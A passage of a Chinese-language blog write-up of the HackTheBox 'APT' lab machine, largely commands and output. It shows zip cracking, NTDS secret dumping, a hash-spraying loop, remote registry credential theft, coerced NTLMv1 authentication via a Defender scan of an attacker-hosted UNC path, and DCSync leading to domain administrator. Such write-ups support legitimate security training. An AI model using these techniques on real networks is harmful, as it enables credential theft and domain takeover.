+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ unzip -l backup.zip <br>Archive:  backup.zip<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>        0  2020-09-23 19:40   Active Directory/<br> 50331648  2020-09-23 19:38   Active Directory/ntds.dit<br>    16384  2020-09-23 19:38   Active Directory/ntds.jfm<br>        0  2020-09-23 19:40   registry/<br>   262144  2020-09-23 19:22   registry/SECURITY<br> 12582912  2020-09-23 19:22   registry/SYSTEM<br>---------                     -------<br> 63193088                     6 files<br><br></code></pre></td></tr></table></figure>
+
+<p>挺有诱惑力的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ zip2john backup.zip&gt;backup.zip.hash<br>$ john -w=/usr/share/wordlists/rockyou.txt backup.zip.hash <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>iloveyousomuch   (backup.zip)     <br>1g 0:00:00:00 DONE (2022-05-27 02:23) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>解压密码是iloveyousomuch。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL &gt; backup.ad.dump<br></code></pre></td></tr></table></figure>
+
+<p>我得到了很多很多哈希。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump |grep <span class="hljs-string">&quot;Administrator:&quot;</span><br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::<br>Administrator:aes256-cts-hmac-sha1-96:d35ae5b9bf5ee7f6c4480bb73b3d8235f022b4fd504c7a3e35b9101b4c40e1d4<br>Administrator:aes128-cts-hmac-sha1-96:26c50872286f2847fc85cf611871106d<br>Administrator:des-cbc-md5:c767fd15d55eabef<br></code></pre></td></tr></table></figure>
+
+<p>但这个哈希不起作用，看起来还是没有我想的那么轻松。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  crackmapexec smb apt -H 2b576acbe6bcfda7294d6bd18041b8fe -u administrator<br>SMB         apt             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)<br>SMB         apt             445    APT              [-] htb.local\administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>
+
+<p>哈希有很多很多，看来我需要筛选一下哪些是能够使用的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump |grep <span class="hljs-string">&quot;:&quot;</span> &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt| awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123; print $1&#125;&#x27;</span> &gt; users.txt<br></code></pre></td></tr></table></figure>
+
+<p>有将近八千条记录，不过有很多重复的，可以用工具去重，然后去枚举哪些是真实有效的用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kerbrute userenum -d htb.local users.txt --dc apt.htb.local -o exituser.txt<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 05/27/22 - Ronnie Flathers @ropnop<br><br>2022/05/27 02:38:51 &gt;  Using KDC(s):<br>2022/05/27 02:38:51 &gt;  	apt.htb.local:88<br><br>2022/05/27 02:38:57 &gt;  [+] VALID USERNAME:	 APT<span class="hljs-variable">$@htb</span>.<span class="hljs-built_in">local</span><br>2022/05/27 02:38:57 &gt;  [+] VALID USERNAME:	 Administrator@htb.local<br>2022/05/27 02:43:14 &gt;  [+] VALID USERNAME:	 henry.vinson@htb.local<br></code></pre></td></tr></table></figure>
+
+<p>看着挺多其实就这一个：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump|grep <span class="hljs-string">&quot;henry.vinson&quot;</span>            <br>henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::<br>henry.vinson:aes256-cts-hmac-sha1-96:4c0ec4cffc953266ed72d9b565da62115655d2f402416af92e4e76d121663e2f<br>henry.vinson:aes128-cts-hmac-sha1-96:da63c28166768a2829f00d30ec9fbddd<br>henry.vinson:des-cbc-md5:80a2c83213b3dfd6<br></code></pre></td></tr></table></figure>
+
+<p>但它的哈希也是无法使用的。或许它的哈希会藏在其他用户哈希中，那么我需要进行喷涂，但是目标机器如果失败次数过多会被拦截封禁。我无法走SMB进行枚举。LDAP不 支持批量。哈希其实挺多都一样：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">janna.espinoza:5176:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:1378<span class="hljs-title">db64d3dee4d691ca0d5ee45644f1</span>:::</span><br><span class="hljs-function"><span class="hljs-title">rylan.harding</span>:5177:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:4<span class="hljs-title">fe2f6b9bc5efce8bbbba036e98bf073</span>:::</span><br><span class="hljs-function"><span class="hljs-title">lindsey.giles</span>:5178:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:9362<span class="hljs-title">ef2b2886d11482238a9de5abf2db</span>:::</span><br><span class="hljs-function"><span class="hljs-title">amata.walter</span>:5179:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="hljs-title">b9452fd4dcc5b4ad01ff8f16182e880</span>:::</span><br><span class="hljs-function"><span class="hljs-title">magdalene.abbott</span>:5180:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e75f4cb02074ed5e9b5aa87f714a0de2</span>:::</span><br><span class="hljs-function"><span class="hljs-title">griffin.long</span>:5181:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:23312<span class="hljs-title">c6dca04f8fa262e79f6072cf73e</span>:::</span><br><span class="hljs-function"><span class="hljs-title">marisa.hawkins</span>:5182:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:1<span class="hljs-title">d6c674ad3be743e042d67a381926cec</span>:::</span><br><span class="hljs-function"><span class="hljs-title">igor.cervantes</span>:5183:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:47<span class="hljs-title">fca05c4ff0bb06c1990aa42099cd68</span>:::</span><br><span class="hljs-function"><span class="hljs-title">yu</span>-<span class="hljs-title">kai.decker</span>:5184:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:c824b104bb78c4b118c9328b44214b49</span>:::</span><br><span class="hljs-function"><span class="hljs-title">marjoke.young</span>:5185:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:10169932<span class="hljs-title">dda21772ceccc3de4e97ab51</span>:::</span><br><span class="hljs-function"><span class="hljs-title">kinna.puckett</span>:5186:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:a0506423413fe76ef4cbc3a7b7af1dbb</span>:::</span><br><span class="hljs-function"><span class="hljs-title">jacquetta.rodriguez</span>:5187:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:858<span class="hljs-title">a8bc0c1e6ab522a8102d8598c8e5b</span>:::</span><br><span class="hljs-function"><span class="hljs-title">martica.hall</span>:5188:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:653<span class="hljs-title">df3e3aad0dc51978f9d9fb3719207</span>:::</span><br><span class="hljs-function"><span class="hljs-title">emma.hansen</span>:5189:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:98609<span class="hljs-title">fabfc2427a65169fbc9ef915a1f</span>:::</span><br><span class="hljs-function"><span class="hljs-title">tiff.martin</span>:5190:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:b6f70c398b118d00e46a23cafe70577a</span>:::</span><br><span class="hljs-function"><span class="hljs-title">seiji.holland</span>:5191:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:cf7b9ddf70f2c061ee41f462ffc9838b</span>:::</span><br><span class="hljs-function"><span class="hljs-title">parker.goodwin</span>:5192:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:f0cdda3a325b7e7b1b84a332bc207d4a</span>:::</span><br><span class="hljs-function"><span class="hljs-title">cuong.pierce</span>:5193:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:413344<span class="hljs-title">e073b892b64af93b8c40bf4aa5</span>:::</span><br><span class="hljs-function"><span class="hljs-title">prue.olson</span>:5194:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:7<span class="hljs-title">c662956a4a0486a80fbb2403c5a9c2c</span>:::</span><br></code></pre></td></tr></table></figure>
+
+<p>起码他们的LM哈希一样。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump |grep <span class="hljs-string">&quot;:::&quot;</span> &gt; hashes.txt<br>$ <span class="hljs-built_in">cat</span> hashes.txt | awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> &gt; newhash.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash </span><br><span class="hljs-comment">#Request the TGT with hash</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> exituser.txt) <br><span class="hljs-keyword">do</span> <br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> newhash.txt) <br>        <span class="hljs-keyword">do</span> <br>                <span class="hljs-built_in">echo</span> trying <span class="hljs-variable">$i</span>:<span class="hljs-variable">$j</span> <br>                <span class="hljs-built_in">echo</span> <br>                getTGT.py htb.local/<span class="hljs-variable">$i</span> -hashes <span class="hljs-variable">$j</span>:<span class="hljs-variable">$j</span>    <br>                <span class="hljs-built_in">echo</span> <br>                <span class="hljs-built_in">sleep</span> 5 <br>        <span class="hljs-keyword">done</span> <br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>通过bash脚本让其批量枚举，最后得出一条可用哈希。 henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb，但是无法将其被用于winrm登录,但可以远程读取注册表项：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ reg.py htb.local/henry.vinson@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU -s | <span class="hljs-built_in">tee</span> hku.reg <br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[!] Cannot check RemoteRegistry status. Hoping it is started...<br>.............<br>&lt;SNIP&gt;<br><br>\Software\GiganticHostingManagementSystem\ <br>        UserName        REG_SZ   henry.vinson_adm <br>        PassWord        REG_SZ   G1<span class="hljs-comment">#Ny5@2dvht </span><br>\Software\Microsoft\<br><br>&lt;/SNIP&gt;<br>.............<br></code></pre></td></tr></table></figure>
+
+<p>这份凭证可以被用来登录winrm：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i htb.local -u henry.vinson_adm -p <span class="hljs-string">&#x27;G1#Ny5@2dvht&#x27;</span><br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\henry.vinson_adm\desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        5/27/2022   5:55 AM             34 user.txt<br><br></code></pre></td></tr></table></figure>
+
+<p>在用户目录中会有一个powershell历史记录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       11/10/2020  10:58 AM            458 ConsoleHost_history.txt<br><br><br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt; <span class="hljs-built_in">cat</span> ConsoleHost_history.txt<br><span class="hljs-variable">$Cred</span> = get-credential administrator<br>invoke-command -credential <span class="hljs-variable">$Cred</span> -computername localhost -scriptblock &#123;Set-ItemProperty -Path <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> lmcompatibilitylevel -Type DWORD -Value 2 -Force&#125;<br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt;<br></code></pre></td></tr></table></figure>
+
+<p>管理员已将身份验证级别设置为级别 2，这显然意味着将仅进行 NTLM 身份验证而不是 NTLMv2。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt; cmd /C C:\Users\<span class="hljs-string">&quot;All Users&quot;</span>\Microsoft\<span class="hljs-string">&quot;Windows Defender&quot;</span>\platform\<span class="hljs-number">4.18</span>.<span class="hljs-number">2010.7</span><span class="hljs-literal">-0</span>\X86\MpCmdRun.exe <span class="hljs-literal">-Scan</span>  <span class="hljs-literal">-ScanType</span> <span class="hljs-number">3</span> <span class="hljs-operator">-File</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.5</span>\hello\win.exe<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">SMB</span>] NTLMv1 Client   : ::ffff:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.213</span><br>[<span class="hljs-type">SMB</span>] NTLMv1 Username : HTB\APT<span class="hljs-variable">$</span><br>[<span class="hljs-type">SMB</span>] NTLMv1 Hash     : APT<span class="hljs-variable">$</span>::HTB:F84EFE769593EF111C527869238BD19C89D9A27C961061EE:F84EFE769593EF111C527869238BD19C89D9A27C961061EE:<span class="hljs-number">001</span>ad42270895f98<br></code></pre></td></tr></table></figure>
+
+<p>我可以使用在线工具破：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">https://crack.sh/netntlm/<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">APT<span class="hljs-variable">$</span>:d167c3238864b12f5f82feae86a7f798<br></code></pre></td></tr></table></figure>
+
+<p>机器账户的哈希，我可以轻易发动DC sync：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ secretsdump.py htb.local/APT\<span class="hljs-variable">$@htb</span>.<span class="hljs-built_in">local</span> -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied <br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::<br>henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::<br>APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i htb.local -u administrator -H c370bddf384a691d811ff3495e8a72e2<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cat</span> ../desktop/root.txt<br>24..........................................<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-APT</div>
+      <div>http://example.com/2022/10/06/HackTheBox-APT/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTHeBox-Giddy/" title="HackTHeBox-Giddy">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTHeBox-Giddy</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-DevOops/" title="HackTheBox-DevOops">
+                        <span class="hidden-mobile">HackTheBox-DevOops</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
